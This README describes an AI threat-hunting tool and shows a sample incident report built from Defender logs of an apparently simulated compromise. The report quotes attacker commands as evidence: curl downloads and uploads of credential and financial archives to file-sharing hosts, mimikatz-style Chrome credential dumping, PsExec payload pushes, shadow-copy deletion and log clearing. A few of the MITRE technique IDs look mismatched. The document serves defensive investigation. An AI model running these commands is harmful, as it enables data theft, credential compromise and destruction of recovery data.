# AI-Threat-Hunter
# 📌 AI Threat Hunting Assistant

An AI-powered threat hunting tool that analyzes Microsoft Defender and Azure logs to reconstruct attacker activity, determine scope of compromise, and guide analysts on next investigative steps.

---

## 🚨 Overview

This project simulates a real-world SOC investigation workflow by assuming a **confirmed compromised account or host** and focusing on:

- Reconstructing the attack timeline  
- Identifying attacker behaviors (credential access, exfiltration, lateral movement, persistence)  
- Determining scope of compromise across users, hosts, and data  
- Highlighting high-signal indicators for environment-wide hunting  
- Recommending targeted follow-up investigations  

Unlike traditional alert-based tools, this system prioritizes **incident understanding and response**, not just detection.

---

## 🧠 Key Features

- 🔍 **Multi-Source Log Analysis**
  - Microsoft Defender for Endpoint (MDE)
  - Azure AD (SigninLogs, AuditLogs)
  - Azure Activity Logs

- 🧩 **Attack Reconstruction**
  - Chronological attack timeline  
  - Grouped attacker behaviors mapped to MITRE ATT&CK  

- 📊 **Scope of Compromise**
  - Affected users, hosts, files, domains, and tools  

- 🎯 **High-Signal Indicators**
  - Curated indicators for threat hunting across the environment  

- 🧭 **Guided Investigation**
  - Recommends next log sources, time windows, and pivots  

- ⚡ **Analyst-Focused Output**
  - Structured, readable incident report  
  - Designed for real SOC workflows  

---

## 🏗️ Example Usage
#### Input

```
The accountname yuki.tanaka is compromised. Look look through logs in deviceprocessevents from start time 2025-11-25T03:51:10.0042487Z and 4 hours later for the DeviceName azuki-adminpc
```
#### Output
```

Deciding log search parameters based on user request...

Query context and metadata:
Table Name:   DeviceProcessEvents
Time Range:   4 hour(s)
Fields:       TimeGenerated, AccountName, ActionType, DeviceName, InitiatingProcessCommandLine, ProcessCommandLine, InitiatingProcessRemoteSessionDeviceName
Device:       azuki-adminpc
Caller:       yuki.tanaka
Username:     yuki.tanaka
User Related: True
Host Related: True
NSG Related:  False
Rationale:
User reported compromise of account 'yuki.tanaka' and specified a particular host 'azuki-adminpc'. DeviceProcessEvents contains process creation and command-line data relevant to investigating account-driven activity on the device. The 4-hour window from the provided start time captures actions immediately after the specified timestamp. Returned fields include TimeGenerated for timeline, AccountName to confirm account context, ActionType to see process actions, DeviceName to ensure host filtering, InitiatingProcessCommandLine and ProcessCommandLine to inspect commands run, and InitiatingProcessRemoteSessionDeviceName to detect whether commands originated from a remote session.

Validating Tables and Fields...
Fields and tables have been validated and comply with the allowed guidelines.

Constructed KQL Query:
DeviceProcessEvents
        | where TimeGenerated between (datetime("2025-11-25T03:51:10.0042487Z")..datetime("2025-11-25T07:51:10.0042487Z"))
        | where DeviceName startswith "azuki-adminpc"
        | where AccountName == "yuki.tanaka"
        | project TimeGenerated, AccountName, ActionType, DeviceName, InitiatingProcessCommandLine, ProcessCommandLine, InitiatingProcessRemoteSessionDeviceName

Querying Log Analytics Workspace ID: '60c7f53e-249a-4077-b68e-55a4ae877d7c'...
263 record(s) returned.

Building threat hunt prompt/instructions...

Model limits and estimated total cost:

gpt-4.1-nano | input limit: 65137/1047576 | rate_limit: 65137/10000000 | out_max: 32768  | est_cost: $0.006714
gpt-4.1      | input limit: 65137/1047576 | rate_limit: 65137/2000000 | out_max: 32768  | est_cost: $0.07
gpt-5-mini   | input limit: 65137/272000  | rate_limit: 65137/10000000 | out_max: 128000 | est_cost: $0.02 <-- (current)
gpt-5        | input limit: 65137/272000  | rate_limit: 65137/2000000 | out_max: 128000 | est_cost: $0.09

✅ Safe: input limit: 65137/272000 is within the input limit for gpt-5-mini.
✅ Safe: rate_limit: 65137/10000000 is within the TPM rate limit for gpt-5-mini.

Continue with 'gpt-5-mini'? (Enter to continue / type a model name / 'list'): 
Selected model is valid: gpt-5-mini

Initiating cognitive threat hunt against targete logs...

Cognitive hunt complete. Took 183.44!

Press [Enter] or [Return] to see results.

======================================================================
🚨 INCIDENT REPORT
======================================================================

== Incident Summary ==
Overview      : The account yuki.tanaka was used to stage, collect credentials, disable defenses, create a local admin account, push/execute a disruptive payload (silentlynx.exe) and exfiltrate multiple sensitive archives to an external file-sharing service. Lateral movement was attempted via PsExec and SSH to multiple internal hosts.
Primary User  : yuki.tanaka
Primary Host  : azuki-adminpc
Severity      : High

== Scope of Compromise ==

USERS:
  - yuki.tanaka (compromised)
  - yuki.tanaka2 (added local account, added to Administrators)
  - kenji.sato (credential used in PsExec)
  - fileadmin (credential used in PsExec)
  - backup-admin (SSH target account)

HOSTS:
  - azuki-adminpc
  - 10.1.0.102
  - 10.1.0.188
  - 10.1.0.204
  - 10.1.0.189

EXTERNAL_IPS:

DOMAINS:
  - litter.catbox.moe
  - store1.gofile.io
  - gofile.io

FILES:
  - C:\Users\yuki.tanaka\Desktop\OLD-Passwords.txt
  - C:\ProgramData\Microsoft\Crypto\staging\Banking (dir)
  - C:\ProgramData\Microsoft\Crypto\staging\QuickBooks (dir)
  - C:\ProgramData\Microsoft\Crypto\staging\Tax-Records (dir)
  - C:\ProgramData\Microsoft\Crypto\staging\Contracts (dir)
  - C:\Windows\Temp\cache\KB5044273-x64.7z
  - C:\Windows\Temp\cache\m-temp.7z
  - C:\Windows\Temp\cache\silentlynx.exe
  - credentials.tar.gz (contains Azuki-Passwords.kdbx, KeePass-Master-Password.txt)
  - chrome-session-theft.tar.gz (contains chrome-real-dump.txt, Chrome-Cookies.db)
  - chrome-credentials.tar.gz (contains chrome-creds.txt, Chrome-Login-Data.db)
  - banking-records.tar.gz
  - quickbooks-data.tar.gz
  - tax-documents.tar.gz
  - contracts-data.tar.gz
  - meterpreter.exe
  - m.exe (DPAPI/mimikatz-like command usage)
  - PsExec64.exe

TOOLS:
  - powershell.exe
  - meterpreter.exe
  - m.exe (dpapi/mimikatz usage)
  - silentlynx.exe
  - PsExec64.exe
  - robocopy.exe
  - tar.exe
  - 7z.exe
  - curl.exe
  - wevtutil.exe
  - vssadmin.exe
  - wbadmin.exe
  - schtasks.exe
  - taskkill.exe
  - bcdedit.exe
  - net.exe

== Attack Timeline ==

[2025-11-25T04:51:08.906806Z]
Encoded PowerShell invoked to add a local account
Details      : powershell.exe launched -EncodedCommand which decodes to create local user yuki.tanaka2
Source Table : DeviceProcessEvents

[2025-11-25T04:51:10.004248Z]
Local account added and elevated to Administrators
Details      : net.exe user yuki.tanaka2 ********** /add  -> net.exe localgroup Administrators yuki.tanaka2 /add
Source Table : DeviceProcessEvents

[2025-11-25T04:13:45.817175Z]
Search for KeePass files
Details      : cmd.exe /c where /r C:\Users *.kdbx (looking for .kdbx password stores)
Source Table : DeviceProcessEvents

[2025-11-25T04:21:11.791743Z]
Download of external archive (staging malware/tooling)
Details      : curl.exe -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
Source Table : DeviceProcessEvents

[2025-11-25T04:21:32.257935Z]
Extraction of downloaded archive
Details      : 7z.exe x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
Source Table : DeviceProcessEvents

[2025-11-25T04:23:24.797568Z]
Interactive reconnaissance and enumeration
Details      : powershell spawned commands: qwinsta.exe, whoami.exe /all, query.exe user, cmdkey.exe /list, nltest.exe /domain_trusts /all_trusts, NETSTAT.EXE -ano
Source Table : DeviceProcessEvents

[2025-11-25T04:37:03.007551Z to 2025-11-25T04:37:38.618262Z]
Bulk data staging via Robocopy
Details      : Robocopy.exe used to copy local user document directories into C:\ProgramData\Microsoft\Crypto\staging\{Banking,Tax-Records,Contracts,QuickBooks}
Source Table : DeviceProcessEvents

[2025-11-25T04:39:16.381653Z to 2025-11-25T04:40:20.875405Z]
Archive creation of staged data
Details      : tar.exe created multiple archives: credentials.tar.gz (Azuki-Passwords.kdbx, KeePass-Master-Password.txt), banking-records.tar.gz, quickbooks-data.tar.gz, tax-documents.tar.gz, contracts-data.tar.gz, chrome-related tarballs
Source Table : DeviceProcessEvents

[2025-11-25T04:41:51.772342Z to 2025-11-25T04:42:33.967095Z]
Exfiltration of archives
Details      : curl.exe -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile and subsequent POSTs for banking-records.tar.gz, quickbooks-data.tar.gz, tax-documents.tar.gz, contracts-data.tar.gz and chrome-session-theft.tar.gz
Source Table : DeviceProcessEvents

[2025-11-25T05:36:52.586540Z to 2025-11-25T05:37:07.959558Z]
Interactive remote access established (meterpreter)
Details      : meterpreter.exe executed then used to run systeminfo and whoami /all indicating an active interactive session
Source Table : DeviceProcessEvents

[2025-11-25T05:55:34.528011Z to 2025-11-25T05:56:50.954951Z]
Download, extract, and credential theft via DPAPI tool
Details      : curl downloaded m-temp.7z -> 7z.exe extracted -> m.exe used: m.exe privilege::debug dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect -> created chrome-session-theft.tar.gz and uploaded via curl to gofile/store1
Source Table : DeviceProcessEvents

[2025-11-25T05:58:35.066651Z to 2025-11-25T06:05:03.056728Z]
Defense disabling and persistence
Details      : Taskkill of AV processes, vssadmin delete shadows /all /quiet, wbadmin delete catalog -quiet, bcdedit to disable recovery, vssadmin resize shadowstorage, creation of scheduled task Microsoft\Windows\Security\SecurityHealthService to run C:\Windows\Temp\cache\silentlynx.exe on logon, multiple wevtutil cl (System/Application/Security/PowerShell) operations
Source Table : DeviceProcessEvents

[2025-11-25T06:03:47.900164Z to 2025-11-25T06:05:01.129750Z]
Lateral execution attempts
Details      : PsExec64.exe used to push and execute C:\Windows\Temp\cache\silentlynx.exe on \10.1.0.102, \10.1.0.188, \10.1.0.204 using supplied credentials; also an SSH attempt: ssh.exe backup-admin@10.1.0.189
Source Table : DeviceProcessEvents

[2025-11-25T06:10:04.914509Z to 2025-11-25T06:10:15.281484Z]
Additional artifact removal
Details      : fsutil usn deletejournal /D C: and additional wevtutil.exe cl commands to clear logging
Source Table : DeviceProcessEvents

== Attacker Activity ==

------------------------------------------------------------
Privilege Escalation
Description: Created a local account and added it to the local Administrators group via encoded PowerShell and net.exe.

Event Count: 4

Evidence:
  - powershell.exe -EncodedCommand ... (created user)
  - net.exe user yuki.tanaka2 ********** /add
  - net.exe localgroup Administrators yuki.tanaka2 /add
  - findstr.exe yuki.tanaka2

MITRE:
  Tactic    : Privilege Escalation
  Technique : Create or Modify Local Account / Add to local group
  ID        : T1136 / T1050

IOCs:
  - yuki.tanaka2
  - powershell.exe -EncodedCommand bgBlAHQAIAB1AHMAZQBy...
  - net.exe localgroup Administrators yuki.tanaka2 /add

------------------------------------------------------------
Credential Access
Description: Extracted Chrome and other credential material using DPAPI/mimikatz-like tooling and targeted KeePass files; targeted browser and password store artifacts.

Event Count: 6

Distinct Files:
  - Azuki-Passwords.kdbx
  - KeePass-Master-Password.txt
  - Chrome-Login-Data.db
  - chrome-real-dump.txt
  - Chrome-Cookies.db

Evidence:
  - powershell.exe "cmd.exe /c where /r C:\Users *.kdbx"
  - m.exe privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect"
  - tar.exe -czf credentials.tar.gz Azuki-Passwords.kdbx KeePass-Master-Password.txt
  - tar.exe -czf chrome-session-theft.tar.gz chrome-real-dump.txt Chrome-Cookies.db

MITRE:
  Tactic    : Credential Access
  Technique : Credential Dumping (DPAPI), Password Store Discovery
  ID        : T1003.006 / T1555

IOCs:
  - m.exe dpapi::chrome
  - Azuki-Passwords.kdbx
  - credentials.tar.gz
  - chrome-session-theft.tar.gz

------------------------------------------------------------
Lateral Movement
Description: Used PsExec and SSH to push/execute silentlynx.exe on internal hosts using harvested/known credentials.

Event Count: 5

Distinct Files:
  - C:\Windows\Temp\cache\silentlynx.exe

Distinct Destinations:
  - 10.1.0.102
  - 10.1.0.188
  - 10.1.0.204
  - 10.1.0.189

Evidence:
  - PsExec64.exe \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
  - PsExec64.exe \\10.1.0.188 -u fileadmin -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
  - PsExec64.exe \\10.1.0.204 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
  - ssh.exe backup-admin@10.1.0.189

MITRE:
  Tactic    : Lateral Movement
  Technique : Remote Services / PsExec / SSH
  ID        : T1021 / T1570

IOCs:
  - PsExec64.exe
  - \\10.1.0.102
  - \\10.1.0.188
  - \\10.1.0.204
  - silentlynx.exe

------------------------------------------------------------
Persistence
Description: Established persistence via a scheduled task pointing to silentlynx.exe and created a privileged local account.

Event Count: 2

Distinct Files:
  - C:\Windows\Temp\cache\silentlynx.exe

Evidence:
  - schtasks /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f

MITRE:
  Tactic    : Persistence
  Technique : Create Account; Scheduled Task
  ID        : T1543.003 / T1136

IOCs:
  - schtasks /create "Microsoft\Windows\Security\SecurityHealthService"
  - silentlynx.exe

------------------------------------------------------------
Defense Evasion
Description: Disabled/terminated AV and backup services, removed shadow copies, disabled recovery and cleared event logs to hinder detection and recovery.

Event Count: 18

Evidence:
  - taskkill /F /IM MsMpEng.exe
  - taskkill /F /IM MpCmdRun.exe
  - net stop WinDefend /y
  - vssadmin delete shadows /all /quiet
  - wbadmin delete catalog -quiet
  - bcdedit /set {default} recoveryenabled No
  - wevtutil cl System; wevtutil cl Application; wevtutil cl Security; wevtutil cl Microsoft-Windows-PowerShell/Operational
  - fsutil usn deletejournal /D C:

MITRE:
  Tactic    : Defense Evasion
  Technique : Clear Logs; Disable/Modify Tools; Delete Shadow Copies
  ID        : T1070 / T1562 / T1490

IOCs:
  - vssadmin.exe delete shadows /all /quiet
  - wevtutil cl
  - wbadmin delete catalog -quiet
  - bcdedit /set {default} recoveryenabled No
  - fsutil usn deletejournal /D C:

------------------------------------------------------------
Execution
Description: Executed multiple secondary payloads and living-off-the-land binaries to collect, package and exfiltrate data (PowerShell launching tar, curl, 7z, robocopy, meterpreter).

Event Count: 40

Distinct Files:
  - tar.exe
  - 7z.exe
  - curl.exe
  - robocopy.exe
  - meterpreter.exe
  - m.exe

Distinct Destinations:
  - https://litter.catbox.moe
  - https://store1.gofile.io/uploadFile

Evidence:
  - powershell.exe "Robocopy.exe C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP"
  - powershell.exe "tar.exe -czf credentials.tar.gz Azuki-Passwords.kdbx KeePass-Master-Password.txt"
  - powershell.exe "curl.exe -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile"
  - powershell.exe "meterpreter.exe"
  - powershell.exe "7z.exe x m-temp.7z -p******** -y"

MITRE:
  Tactic    : Execution
  Technique : Command and Scripting Interpreter; Exploitation for Client Execution
  ID        : T1059 / T1203

IOCs:
  - meterpreter.exe
  - m-temp.7z
  - KB5044273-x64.7z
  - curl.exe -X POST -F file=@*.tar.gz https://store1.gofile.io/uploadFile

------------------------------------------------------------
Exfiltration
Description: Multiple archives containing passwords, financial records and browser credentials were uploaded to an external file hosting service.

Event Count: 7

Distinct Files:
  - credentials.tar.gz
  - banking-records.tar.gz
  - quickbooks-data.tar.gz
  - tax-documents.tar.gz
  - contracts-data.tar.gz
  - chrome-session-theft.tar.gz
  - chrome-credentials.tar.gz

Distinct Destinations:
  - store1.gofile.io (upload)
  - gofile.io

Evidence:
  - curl.exe -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile
  - curl.exe -X POST -F file=@banking-records.tar.gz https://store1.gofile.io/uploadFile
  - curl.exe -X POST -F file=@quickbooks-data.tar.gz https://store1.gofile.io/uploadFile
  - curl.exe -X POST -F file=@tax-documents.tar.gz https://store1.gofile.io/uploadFile
  - curl.exe -X POST -F file=@contracts-data.tar.gz https://store1.gofile.io/uploadFile
  - curl.exe -X POST -F file=@chrome-session-theft.tar.gz https://store1.gofile.io/uploadFile
  - curl.exe -X POST -F file=@chrome-credentials.tar.gz https://store1.gofile.io/uploadFile

MITRE:
  Tactic    : Exfiltration
  Technique : Exfiltration Over Web Service
  ID        : T1041 / T1567

IOCs:
  - https://store1.gofile.io/uploadFile
  - credentials.tar.gz
  - chrome-session-theft.tar.gz

== Impact Assessment ==
credentials_compromised: True
lateral_movement_observed: True
data_exfiltration_observed: True
persistence_established: True
defense_evasion_observed: True
destructive_actions_observed: True

== Further Investigation ==

------------------------------------------------------------
Purpose     : Confirm exfiltration endpoints, file hashes and list all uploaded artifacts
Table       : DeviceNetworkEvents / DeviceProcessEvents / DeviceFileEvents
Timestamp   : 2025-11-25T04:39:00Z
Time Window : 04:20:00 to 04:50:00
Why         : Verify exactly which files were uploaded and capture remote upload endpoints and file hashes to support take-down, IOC blocking and data recovery
Search Guidance:
  - Filter DeviceProcessEvents on azuki-adminpc for curl.exe and 7z.exe and tar.exe invocations
  - Find DeviceNetworkEvents outbound connections to store1.gofile.io and litter.catbox.moe
  - Query DeviceFileEvents for creation of *.tar.gz and files under C:\ProgramData\Microsoft\Crypto\staging and C:\Windows\Temp\cache
Suggested KQL:
  DeviceProcessEvents | where DeviceName == "azuki-adminpc" and (ProcessCommandLine contains "curl.exe" or ProcessCommandLine contains "-X POST" or ProcessCommandLine contains "-o C:\\Windows\\Temp\\cache") | project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine

------------------------------------------------------------
Purpose     : Locate and triage silentlynx.exe, meterpreter, m.exe and other payloads on azuki-adminpc and remote targets
Table       : DeviceFileEvents / DeviceProcessEvents / MDE alerts
Timestamp   : 2025-11-25T05:55:00Z
Time Window : 05:30:00 to 06:15:00
Why         : Confirm lateral compromise and remove/contain implanted binaries on other hosts
Search Guidance:
  - Search for file creation and execution of C:\Windows\Temp\cache\silentlynx.exe, m.exe, meterpreter.exe, PsExec64.exe
  - Check DeviceFileEvents and DeviceProcessEvents on 10.1.0.102, 10.1.0.188, 10.1.0.204, 10.1.0.189 for presence and execution of silentlynx.exe
  - Pull hashes and quarantine indicators
Suggested KQL:
  DeviceProcessEvents | where ProcessCommandLine has "silentlynx.exe" or FileName in~ ("meterpreter.exe","m.exe","PsExec64.exe") | project TimeGenerated, DeviceName, InitiatingProcessCommandLine, ProcessCommandLine

------------------------------------------------------------
Purpose     : Capture volatile data and evidence from azuki-adminpc before remediation
Table       : Live response / Endpoint forensic collection
Timestamp   : 2025-11-25T06:05:00Z
Time Window : now (immediate)
Why         : Memory and artifact capture are required to extract credentials, lateral authentication tokens, and evidence of active implants (meterpreter), and to support remediation
Search Guidance:
  - Collect full memory image, running process list, open network connections, scheduled tasks, registry autoruns, and current user tokens
  - Export the scheduled task definition for Microsoft\Windows\Security\SecurityHealthService and collect C:\Windows\Temp\cache contents

------------------------------------------------------------
Purpose     : Pivot to Azure / Identity to assess credential misuse and lateral access
Table       : SigninLogs / AuditLogs
Timestamp   : 2025-11-25T04:50:00Z
Time Window : 04:40:00 to 06:30:00
Why         : Determine account misuse across environment, identify lateral hops and impacted identities to reset/contain
Search Guidance:
  - Search for sign-ins from azuki-adminpc, new local admin user activities, conditional access failures, and use of service accounts (kenji.sato, fileadmin, backup-admin)
  - Look for anomalous RDP/SSH or PsExec correlated activity from the compromised host

== Recommended Actions ==
  - Immediately isolate azuki-adminpc from the network (block all inbound/outbound) and preserve full forensic image (memory + disk).
  - Disable and lock the compromised account yuki.tanaka and the newly created local account yuki.tanaka2; reset/rotate credentials for any accounts observed in PsExec/SSH (kenji.sato, fileadmin, backup-admin) and force re-authentication.
  - Block and quarantine C:\Windows\Temp\cache\silentlynx.exe, m.exe, meterpreter.exe and related artifacts; gather hashes and push YARA/AV signatures to endpoints and EDR for immediate hunt.
  - Block outbound network traffic to litter.catbox.moe and store1.gofile.io at perimeter and endpoint controls; preserve egress logs for those destinations.
  - Immediately run host triage on 10.1.0.102, 10.1.0.188, 10.1.0.204, 10.1.0.189: collect process lists, scheduled tasks, file system for C:\Windows\Temp\cache and C:\ProgramData\Microsoft\Crypto\staging, and quarantine if silentlynx.exe present; disable remote execution channels (PsExec/SMB/SSH) until validated.
  - Extract and preserve copies of all exfiltrated archives (credentials.tar.gz, banking-records.tar.gz, quickbooks-data.tar.gz, tax-documents.tar.gz, contracts-data.tar.gz, chrome-session-theft.tar.gz, chrome-credentials.tar.gz) from azuki-adminpc and retain upload metadata (timestamps, destination URLs) for law enforcement/takedown.

== Key IOCs ==
  - {'type': 'account', 'value': 'yuki.tanaka'}
  - {'type': 'account', 'value': 'yuki.tanaka2'}
  - {'type': 'host', 'value': 'azuki-adminpc'}
  - {'type': 'hosts_attempted', 'value': ['10.1.0.102', '10.1.0.188', '10.1.0.204', '10.1.0.189']}
  - {'type': 'domain', 'value': 'store1.gofile.io'}
  - {'type': 'domain', 'value': 'litter.catbox.moe'}
  - {'type': 'process', 'value': 'silentlynx.exe (C:\\Windows\\Temp\\cache\\silentlynx.exe)'}
  - {'type': 'process', 'value': 'meterpreter.exe'}
  - {'type': 'process', 'value': 'm.exe (DPAPI usage)'}
  - {'type': 'process', 'value': 'PsExec64.exe'}
  - {'type': 'command', 'value': 'powershell.exe -EncodedCommand bgBlAHQAIAB1AHMAZQBy...'}
  - {'type': 'command', 'value': 'vssadmin delete shadows /all /quiet'}
  - {'type': 'file', 'value': 'credentials.tar.gz (contains Azuki-Passwords.kdbx, KeePass-Master-Password.txt)'}
  - {'type': 'file', 'value': 'chrome-session-theft.tar.gz (contains chrome-real-dump.txt, Chrome-Cookies.db)'}
  - {'type': 'file', 'value': 'banking-records.tar.gz'}
  - {'type': 'file', 'value': 'quickbooks-data.tar.gz'}
  - {'type': 'file', 'value': 'tax-documents.tar.gz'}
  - {'type': 'file', 'value': 'contracts-data.tar.gz'}
  - {'type': 'file', 'value': 'C:\\ProgramData\\Microsoft\\Crypto\\staging (staging directory)'}
  - {'type': 'url', 'value': 'https://store1.gofile.io/uploadFile'}
  - {'type': 'url', 'value': 'https://litter.catbox.moe/gfdb9v.7z'}
  - {'type': 'url', 'value': 'https://litter.catbox.moe/mt97cj.7z'}

======================================================================
```
---

## 🛠️ Tech Stack

- Python  
- Azure Monitor Logs (Log Analytics Workspace)  
- Microsoft Defender for Endpoint  
- OpenAI API  

---

## 🚀 How It Works

1. Pull logs from Azure / MDE  
2. Send logs + system prompts to AI  
3. AI:
   - reconstructs attack timeline  
   - groups behaviors  
   - extracts indicators  
   - recommends investigation pivots  
4. Outputs structured incident report  

---

## 🧠 Example Use Case

A compromised user account is detected. Instead of manually reviewing hundreds of logs, this tool:

- Reconstructs attacker actions  
- Identifies sensitive data accessed or exfiltrated  
- Shows impacted systems and accounts  
- Guides the analyst on where to pivot next  

👉 Reduces investigation time and improves response accuracy.

---

## 📚 Future Improvements

- Auto-generated KQL queries for each investigation pivot  
- IOC scoring (high vs low signal ranking)  
- Web-based dashboard (React frontend)  
- Integration with SIEM/SOAR workflows  

---
